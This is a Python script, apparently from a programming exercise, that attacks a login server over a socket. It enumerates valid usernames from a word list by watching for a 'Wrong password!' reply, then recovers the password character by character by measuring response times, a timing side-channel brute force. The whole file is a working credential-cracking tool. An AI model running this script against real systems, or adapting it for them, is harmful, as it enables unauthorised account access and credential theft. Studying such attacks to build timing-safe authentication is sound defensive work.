import json
import os
import socket
import string
import time
from sys import argv

WRONG_PWD_MSG = 'Wrong password!'
SUCCESS_MSG = 'Connection success!'
LETTERS = string.ascii_letters + string.digits


def get_json(login: str, pwd: str) -> str:
    return json.dumps({'login': login,
                       'password': pwd},
                      indent=4)


def send_receive(login: str, pwd: str, s: socket.socket) -> str:
    data = get_json(login, pwd).encode()
    s.send(data)
    raw = s.recv(1024)
    return json.loads(raw.decode())['result']


def find_login(s: socket.socket) -> str:
    with open(os.path.join(os.getcwd(), 'logins.txt')) as f:
        logins = (x[:-1] for x in f.readlines())
    for login in logins:
        msg = send_receive(login, ' ', s)
        if msg == WRONG_PWD_MSG:
            return login


def find_pwd(login: str, s: socket.socket) -> str:
    pwd, sym, msg = ('' for _ in range(3))
    while msg != SUCCESS_MSG:
        for i in range(len(LETTERS)):
            sym = LETTERS[i]
            start_time = time.perf_counter()
            msg = send_receive(login, pwd + sym, s)
            duration = time.perf_counter() - start_time
            if msg == SUCCESS_MSG or duration >= .1:
                break
        pwd += sym
    return pwd


def main():
    ip, port, = argv[1], int(argv[2])
    with socket.socket() as s:
        s.connect((ip, port))
        login = find_login(s)
        pwd = find_pwd(login, s)
        print(get_json(login, pwd))


if __name__ == '__main__':
    main()
